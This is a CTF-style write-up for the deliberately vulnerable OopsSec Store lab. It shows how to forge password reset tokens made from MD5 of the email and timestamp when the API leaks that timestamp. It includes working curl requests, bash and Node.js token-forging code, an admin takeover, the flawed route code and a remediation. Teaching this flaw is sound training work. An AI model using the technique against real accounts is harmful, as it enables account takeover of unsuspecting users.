---
author: kOaDT
authorGithubUrl: https://github.com/kOaDT
authorGithubAvatar: https://avatars.githubusercontent.com/u/17499022?v=4
pubDatetime: 2026-02-26T21:11:00Z
title: "Insecure Password Reset: Predictable Token Forgery"
slug: insecure-password-reset
draft: false
tags:
  - writeup
  - authentication
  - ctf
description: Exploit a predictable password reset token generation mechanism to take over any user account.
---

The password reset on OopsSec Store builds tokens from `MD5(email + timestamp)`. The timestamp is right there in the API response. You can forge a valid reset token for any account in one request.

## Table of contents

## Lab setup

Start the lab:

```bash
npx create-oss-store@latest
```

The app runs at `http://localhost:3000`.

## Target identification

### Step 1: Find the password reset flow

Go to `/login`. There's a "Forgot password?" link below the password field. Click it to reach `/login/forgot-password`.

### Step 2: Watch the API response

Enter your own email (e.g., `alice@example.com`) and submit. Open DevTools (Network tab) and look at the response from `POST /api/auth/forgot-password`:

```json
{
  "message": "If an account with that email exists, a password reset link has been sent.",
  "requestedAt": "2026-02-26T10:30:45.123Z"
}
```

That `requestedAt` field is a precise ISO timestamp. Why would a "check your email" response include the exact server time?

## Exploitation

### Step 3: Figure out the token algorithm

Dig into the source or experiment. The reset token is:

```
token = MD5(email + Math.floor(Date.now() / 1000))
```

The `requestedAt` timestamp tells you the exact second the token was created.

### Step 4: Request a reset for any user

Pick a target. Alice works:

```bash
curl -s -X POST http://localhost:3000/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com"}'
```

Grab the `requestedAt` value from the response.

### Step 5: Forge the token

Convert the ISO timestamp to Unix seconds and compute the MD5 hash:

```bash
# Example: requestedAt = "2026-02-26T10:30:45.123Z"
TIMESTAMP=$(date -d "2026-02-26T10:30:45.123Z" +%s)
TOKEN=$(echo -n "alice@example.com${TIMESTAMP}" | md5sum | cut -d' ' -f1)
echo $TOKEN
```

Or with Node.js:

```javascript
const crypto = require("crypto");
const requestedAt = "2026-02-26T10:30:45.123Z";
const timestamp = Math.floor(new Date(requestedAt).getTime() / 1000);
const token = crypto
  .createHash("md5")
  .update("alice@example.com" + timestamp)
  .digest("hex");
console.log(token);
```

### Step 6: Reset the password and get the flag

```bash
curl -s -X POST http://localhost:3000/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"${TOKEN}\",\"password\":\"hacked123\"}"
```

```json
{
  "message": "Your password has been reset successfully.",
  "flag": "OSS{1ns3cur3_p4ssw0rd_r3s3t}"
}
```

### Bonus: admin account takeover

Same technique, different email. Request a reset for `admin@oss.com`, forge the token, reset the password, log in at `/login`.

## Vulnerable code analysis

The bug is in the token generation at `/app/api/auth/forgot-password/route.ts`:

```typescript
// app/api/auth/forgot-password/route.ts
const now = new Date();
const requestedAt = now.toISOString();
const timestamp = Math.floor(now.getTime() / 1000);

const token = hashMD5(email + timestamp);

return NextResponse.json({
  message:
    "If an account with that email exists, a password reset link has been sent.",
  requestedAt, // This leaks the timestamp used in token generation
});
```

Both inputs to the hash are known to the attacker. They sent the email in the request. The server hands back the timestamp in the response. That's everything you need.

## Remediation

Generate tokens with `crypto.randomBytes` instead of a deterministic hash:

```typescript
import crypto from "crypto";

const token = crypto.randomBytes(32).toString("hex");
```

Drop the `requestedAt` field from the response, and add rate limiting on the endpoint.
